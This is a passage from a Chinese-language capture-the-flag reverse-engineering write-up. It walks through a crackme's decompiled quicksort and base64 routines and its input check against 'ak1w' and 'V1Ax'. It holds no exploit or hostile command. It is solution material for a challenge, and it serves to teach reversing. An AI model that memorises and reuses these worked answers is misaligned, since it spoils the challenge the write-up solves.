data-num="10"></td><td><pre>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ecx</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>  result <span class="token operator">=</span> a3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> a2<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> a3<span class="token punctuation">;</span> a2 <span class="token operator">=</span> i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    v5 <span class="token operator">=</span> i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment">//v6 = *(DWORD *)(4 * i + a1);</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    v6 <span class="token operator">=</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;</span> result <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>      <span class="token keyword">do</span></pre></td></tr><tr><td data-num="22"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token comment">//if ( v6 > *(DWORD *)(a1 + 4 * result) )</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>          <span class="token operator">++</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>          <span class="token comment">//*(DWORD *)(v5 + a1) = *(DWORD *)(a1 + 4 * result);</span></pre></td></tr><tr><td data-num="30"></td><td><pre>          a1<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>          <span class="token comment">//while ( *(DWORD *)(a1 + 4 * i) &lt;= v6 )</span></pre></td></tr><tr><td data-num="34"></td><td><pre>          <span class="token keyword">while</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> v6 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>              <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>          v5 <span class="token operator">=</span> i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>          <span class="token comment">//*(DWORD *)(a1 + 4 * result) = *(DWORD *)(4 * i + a1);</span></pre></td></tr><tr><td data-num="43"></td><td><pre>          a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token operator">--</span>result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>      <span class="token keyword">while</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> result <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>LABEL_13<span class="token operator">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token comment">//*(DWORD *)(a1 + 4 * result) = v6;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token operator">=</span> v6<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token function">sub</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    result <span class="token operator">=</span> a3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token operator">++</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    cout<span class="token operator">&lt;&lt;</span><span class="token string">">>>>sub"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token function">sub</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">11</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>        cout<span class="token operator">&lt;&lt;</span><span class="token string">"a["</span><span class="token operator">&lt;&lt;</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token operator">&lt;&lt;</span><span class="token string">"]"</span><span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token comment">//cout&lt;&lt;a[i]&lt;&lt;" ";</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行结果如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token number">3</span> <span class="token number">51</span></pre></td></tr><tr><td data-num="2"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>C <span class="token number">67</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span>E <span class="token number">69</span></pre></td></tr><tr><td data-num="4"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span>H <span class="token number">72</span></pre></td></tr><tr><td data-num="5"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span>J <span class="token number">74</span></pre></td></tr><tr><td data-num="6"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span>N <span class="token number">78</span></pre></td></tr><tr><td data-num="7"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span>S <span class="token number">83</span></pre></td></tr><tr><td data-num="8"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span>Z <span class="token number">90</span></pre></td></tr><tr><td data-num="9"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span>a <span class="token number">97</span></pre></td></tr><tr><td data-num="10"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span>g <span class="token number">103</span></pre></td></tr><tr><td data-num="11"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span>n <span class="token number">110</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328182556648.png" alt="image-20220328182556648" /></p>
<p>继续往下推，发现有：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_401000</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_401000</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>跟进 sub_401000 函数查看：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>_BYTE <span class="token operator">*</span>__cdecl <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// esi</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// ebx</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  _BYTE <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  _BYTE <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// edi</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  _BYTE <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment">// ebx</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// edi</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// edx</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// edi</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// esi</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  _BYTE <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  _BYTE <span class="token operator">*</span>v15<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-10h]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  _BYTE <span class="token operator">*</span>v16<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-Ch]</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-8h]</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-4h]</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>  v2 <span class="token operator">=</span> a2 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token operator">++</span>v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  v4 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  v5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  v15 <span class="token operator">=</span> v5<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v5 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  v7 <span class="token operator">=</span> a2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  v8 <span class="token operator">=</span> v6<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  v16 <span class="token operator">=</span> v6<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>      v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>      v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>      v18 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>      <span class="token keyword">do</span></pre></td></tr><tr><td data-num="43"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">>=</span> v7 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>          <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token operator">++</span>v10<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        v9 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v9 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token operator">++</span>v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>      <span class="token keyword">while</span> <span class="token punctuation">(</span> v10 <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>      v11 <span class="token operator">=</span> v9 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">-</span> v10<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>      v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>      v17 <span class="token operator">=</span> v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>      <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span> i <span class="token operator">-=</span> <span class="token number">6</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v10 <span class="token operator">>=</span> v12 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v18 <span class="token operator">+</span> v12<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v11 <span class="token operator">>></span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>          v8 <span class="token operator">=</span> v16<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token keyword">else</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v18 <span class="token operator">+</span> v12<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token operator">*</span>v8<span class="token operator">++</span> <span class="token operator">=</span> byte_407830<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v18 <span class="token operator">+</span> v12<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>        v16 <span class="token operator">=</span> v8<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>      v3 <span class="token operator">=</span> v17<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v17 <span class="token operator">>=</span> a2 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>      v7 <span class="token operator">=</span> a2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    v6 <span class="token operator">=</span> v15<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>  result <span class="token operator">=</span> v6<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>  <span class="token operator">*</span>v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328182748904.png" alt="image-20220328182748904" /></p>
<p>跟进 <code>byte_407830函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328182846498.png" alt="image-20220328182846498" /></p>
<p>得到如下结果：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00407830</span> byte_407830     db <span class="token number">41</span>h                  <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_401000<span class="token operator">+</span>C0↑r</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00407831</span> aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789<span class="token operator">+</span><span class="token operator">/=</span>'<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328182916320.png" alt="image-20220328182916320" /></p>
<p>熟悉的朋友知道 0x41h 转换为 ASCII 就是 A，这里我们也可以进行提取转换如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328183017466.png" alt="image-20220328183017466" /></p>
<p>也就是说经过如下字符进行加密，也就是我们的 base64 加密</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789<span class="token operator">+</span><span class="token operator">/=</span></pre></td></tr></table></figure><p>不熟悉的朋友也可直接百度查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328183246941.png" alt="image-20220328183246941" /></p>
<p>分析到这里我们可以知道，结果是经过 base64 编码所得到的</p>
<p>接下来我们继续往后推，也就是如下的判断程序</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">34</span>              <span class="token comment">//sub_4010F0 函数后的第一位等于 51+34=85-->'U'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token operator">&amp;&amp;</span> String<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> v10                     <span class="token comment">// 第 2 位，等于 v10, 即 sub_4010F0 函数返回值的第 5 位值 -->'J'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token operator">&amp;&amp;</span> <span class="token number">4</span> <span class="token operator">*</span> String<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">141</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token operator">*</span> v8</pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token operator">&amp;&amp;</span> String<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v13 <span class="token operator">/</span> <span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"ak1w"</span><span class="token punctuation">)</span>                  <span class="token comment">// 第 6,7,8 行代码 base64 之后，需要等于 "ak1w"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>                             <span class="token comment">// 第 3,4,5 行代码，加密之后等于 V1Ax</span></pre></td></tr><tr><td data-num="7"></td><td><pre>              v5<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>              <span class="token string">"V1Ax"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hDlg<span class="token punctuation">,</span> <span class="token string">"U g3t 1T!"</span><span class="token punctuation">,</span> <span class="token string">"@_@"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>分析结果如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328183733318.png" alt="image-20220328183733318" /></p>
<p>通过这里，我们知道</p>
